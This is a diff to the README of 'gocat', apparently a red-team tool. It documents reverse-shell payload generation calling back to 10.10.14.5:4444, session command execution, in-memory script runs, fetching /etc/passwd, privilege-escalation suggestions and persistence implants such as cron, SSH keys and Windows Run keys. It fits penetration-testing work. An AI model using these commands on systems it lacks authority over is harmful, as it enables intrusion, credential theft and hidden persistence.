@@ -87,6 +87,10 @@ gocat payload 10.10.14.5 4444 --type powershell --encode
 ```bash
 gocat listen 8080                            # Simple listener
 gocat listen --session --auto-upgrade 4444   # Session mode
+gocat listen --session --single-session 4444 # Stop after first session
+gocat listen --iface eth0 4444               # Bind via interface address
+gocat listen --listen-ssl 4443               # TLS (self-signed if no cert given)
+gocat listen --ssh-trigger user@target 4444  # SSH in and trigger a callback
 echo 'Hello!' | gocat connect localhost 8080
 ```
 </details>
@@ -103,10 +107,29 @@ gocat console
 > sessions                 # List active sessions
 > interact 1               # Attach to session (F12 to detach)
 > upgrade 1 auto           # Upgrade to PTY
+> exec 1 whoami            # Run a command through the session
+> script 1 enum.sh         # Run a local script in memory, no disk touch
+> open 1 /etc/passwd       # Download and open locally
+> search privesc           # Search post-exploitation modules
+> info linpeas             # Module details (info <id> for sessions)
+> run escalate 1           # GTFOBins-based escalation suggestions
+> run implant 1            # cron/key/systemd/profile/reg/task persistence
 > spawn 1                  # Spawn new reverse shell
 > maintain 2               # Keep 2 sessions per host
 > agent 1                  # Deploy Python agent
 > portfwd 1 8080 127.0.0.1:80  # Port forward through agent
+> set lhost 10.0.0.5       # Saved to ~/.gocatrc automatically
+```
+</details>
+
+### Sessions Export and Reports
+
+```bash
+gocat session list --json --output sessions.json
+gocat session list --csv
+gocat console
+> run enumerate 1          # Cache facts, writes ENUM.md
+> run report 1 out.md      # Markdown host report to file
 ```
 </details>
 
@@ -147,10 +170,13 @@ gocat stabilize --upgrade --method python  # Specific method
 - Packet sniffer, network benchmarks, Prometheus metrics (`/metrics`, `/health`)
 
 ### Sessions and Post-Exploitation
-- Session registry with logging, maintain-N respawn, per-host caps
+- Session registry with logging, maintain-N respawn, per-host caps, JSON/CSV export
 - PTY auto-upgrade (python/script/socat), in-memory script execution
 - Upload/download, local/remote port forwarding through sessions
 - Helper modules: linpeas/winpeas, adPEAS, GhostPack Seatbelt, mimikatz, chisel, ligolo-ng, enumeration and host reports, implant tracking
+- Escalation suggestions from an offline GTFOBins database (sudo/suid/caps/writable-PATH)
+- Persistence implants: cron, systemd user service, shell profile, SSH key, Windows Run key, scheduled task
+- Console settings persist to `~/.gocatrc`; Ctrl+C cancels the line, F12/Ctrl+] detaches
 
 ### Everyday Tooling
 - Shell completion (bash, zsh, fish, PowerShell), color themes, Lua scripting
